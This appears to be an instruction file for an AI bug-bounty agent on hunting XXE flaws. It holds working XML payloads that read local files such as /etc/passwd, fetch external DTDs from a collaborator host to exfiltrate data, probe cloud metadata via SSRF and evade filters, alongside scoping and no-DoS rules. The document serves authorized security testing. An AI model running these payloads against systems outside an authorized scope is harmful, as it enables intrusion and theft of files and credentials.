---
name: hunt-xxe
description: Hunting skill for xxe vulnerabilities. Built from 10 public bug bounty reports including SVG-upload XXE, Office-doc (PPTX/DOCX) XXE, SOAP XXE, SAML AssertionConsumer XXE, blind OOB XXE via DTD callback, parameter-entity XXE, XXE-to-LFI, XXE-to-SSRF, and XXE-to-RCE chains (Adobe Commerce CosmicSting CVE-2024-34102). Use when hunting XXE on any target — emphasis on OOB-Or-It-Didn't-Happen Gate for blind cases.
sources: github, hackerone_public, assetnote_research, splunk_security
report_count: 10
---

# HUNT-XXE — XML external entities

The parser resolves a DTD entity or an XInclude and reads a URI you chose. Modern defaults often refuse DTDs. An inline entity that does not expand means **this parser path** is closed — try another content-type or another endpoint, do not keep sending `file://` at the same one.

## Rails
- In-scope only. One local file or one internal URL as proof.
- No billion-laughs, no quadratic-blowup, no entity bombs. Those are DoS.
- No mass file read. `/etc/passwd` or `win.ini`, then one config file if you need impact.
- Stop at draft. Never auto-submit.
- A DNS lookup with no file bytes and no internal HTTP body is "the parser fetches URIs". Do not call it file read or cloud compromise.

## Decision tree

1. **Find XML.** `Content-Type` `application/xml`, `text/xml`, `application/soap+xml`, `application/xhtml+xml`, `image/svg+xml`, SOAP, SAML ACS, RSS/Atom, WebDAV, DOCX/XLSX/PPTX/SVG/GPX/KML upload, PDF XFA, `xmlrpc`. Also re-send a JSON POST as `application/xml` once — some stacks switch parsers on the header.
2. **Inline probe (no network):**
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE foo [<!ENTITY uniq "XXEUNIQ">]>
   <root>&uniq;</root>
   ```
   `XXEUNIQ` in the response → entities expand. If it is missing or the parser errors on `DOCTYPE`, skip SYSTEM entities on this endpoint. Try XInclude (step 5) and a different endpoint.
3. **In-band file:**
   ```xml
   <!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>
   <root>&x;</root>
   ```
   Windows: `file:///C:/Windows/win.ini`. PHP filter when the body is garbled: `php://filter/convert.base64-encode/resource=/etc/passwd`.
4. **No reflection → OOB.** Parameter entities, not a general entity, when the file must leave the server:
   ```xml
   <!DOCTYPE foo [
     <!ENTITY % dtd SYSTEM "http://UNIQUE.collab/x.dtd">
     %dtd;
   ]>
   <root/>
   ```
   Host `x.dtd` only if you can (your collaborator that logs the HTTP path is enough for the fetch proof). For file bytes, the external DTD has to echo them back — newlines and `&` in the file break a URL, so prefer the PHP base64 filter or the error channel (step 6). A hit proves the fetch. It does not prove `/etc/passwd`.
5. **DOCTYPE blocked → XInclude** (no DTD):
   ```xml
   <root xmlns:xi="http://www.w3.org/2001/XInclude">
     <xi:include parse="text" href="file:///etc/passwd"/>
   </root>
   ```
6. **Egress blocked → error-based or a local DTD.** Force the file into a parser error string (`file:///does-not-exist/%file;`). If outbound HTTP is closed but local DTD files exist, redefine a parameter entity from a DTD that is already on disk (the "repurpose a local DTD" technique). Claim it only when the error body contains file bytes.
7. **SSRF.** Point `SYSTEM` at `http://127.0.0.1:<port>/` and at link-local metadata. IMDSv1 may return role JSON. IMDSv2 answers GET with 401 until a PUT token — XXE cannot set that flow unless you show the token request. 401 from the metadata IP is reachability, not keys. GCP needs header `Metadata-Flavor: Google`, which most XXE sinks cannot add.
8. **Office/SVG.** Unzip the document, inject the entity into `word/document.xml`, `xl/workbook.xml`, `ppt/slides/slide1.xml`, or `[Content_Types].xml`, rezip, upload. SVG: entity in a `<text>` node. Same validation as step 3.

## Parser expectations (probe anyway)

| Stack | Usual default | What changes the answer |
|---|---|---|
| Java SAX/DOM/JAXB, older Spring | SYSTEM resolved | `XMLConstants.FEATURE_SECURE_PROCESSING`, external-entity features off |
| PHP `DOMDocument` / `simplexml` | entities **not** substituted unless `LIBXML_NOENT` | the flag, or an old libxml |
| .NET `XmlDocument` | DTD prohibited since 4.5.2 | `DtdProcessing.Parse` and a non-null `XmlResolver` |
| Python `xml.etree`, `defusedxml` | safe | a different library on the same app (`lxml` with network on can still fetch) |
| Ruby Nokogiri | safe | `DTDLOAD` / `NOENT` parse options |
| Browser-side SVG | not server XXE | need the server to parse the XML |

Fingerprint (`Tomcat`, `X-Powered-By: PHP`, `IIS`, a Java stack trace) only **orders** the test. The inline probe is the decision.

## Bypasses
- Case: `<!DocType` / `<!EntitY` when a naive filter looks for lowercase.
- UTF-16 BOM so a byte-scanner misses `<!DOCTYPE`.
- Parameter entity instead of general entity (`%xxe;`) — required for blind file exfil.
- Schemes: `file://`, `netdoc://` (Java), `jar:file://`, `php://filter/convert.base64-encode/resource=`, `gopher://` to a port you already may touch. `expect://id` is RCE only if that PHP extension is loaded — rare; treat a hit as `hunt-rce`.
- CDATA and SOAP body: the entity must sit where this operation parses XML, not inside a string the app never feeds to a parser.
- Content-Type confusion: `application/xml`, `text/xml`, missing content-type, multipart file part.

## Validation
- **File read:** response (or error string, or OOB HTTP query) contains file contents — `root:x:0:0:` or `[fonts]` from `win.ini` — not the path you typed.
- **SSRF:** body or timing-independent evidence from the internal service (metadata JSON keys, an internal title). Quote it.
- **Fetch only:** one DNS/HTTP hit on `UNIQUE.collab` from the target IP. Report as outbound XXE. Severity stays below file-read unless you also show data.
- **Not a finding:** DOCTYPE rejected, inline entity not echoed, your XML echoed back unchanged, a callback you triggered from your own machine.

CosmicSting (CVE-2024-34102) is nested XML parsing inside Adobe Commerce/Magento leading to `env.php` crypt-key read. Use it only on that product, and stop at the key read plus one forged-admin proof if the program allows it. Do not turn it into a webshell tutorial.

## Chains
- File bytes with a DB password or cloud key → that is the impact. Do not guess at RCE.
- `web.config` machineKey → `hunt-deserialization` once.
- Metadata role JSON (IMDSv1) → one `sts`/`s3` call the role allows, then stop.
- SVG/DOCX upload → this skill; stored XSS in the same SVG is `hunt-xss` only if a browser executes it on the target origin.
- XSLT `rt:exec` or `expect://` → `hunt-rce` only with command output.

## Before you report — dedup gate

Fresh/changed surface first (see `dedup-novelty`, `changed-js-deepdive`), and hunt classes in yield
order (`/yield`). Before drafting ANY finding from this skill, run the dedup gate:

```bash
python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
```

`NOVEL` -> proceed to `/validate`. `LIKELY_DUP` -> stop unless you can prove a concrete differentiator
(different endpoint/param/impact, or a bypass of the deployed fix -> report as a regression).
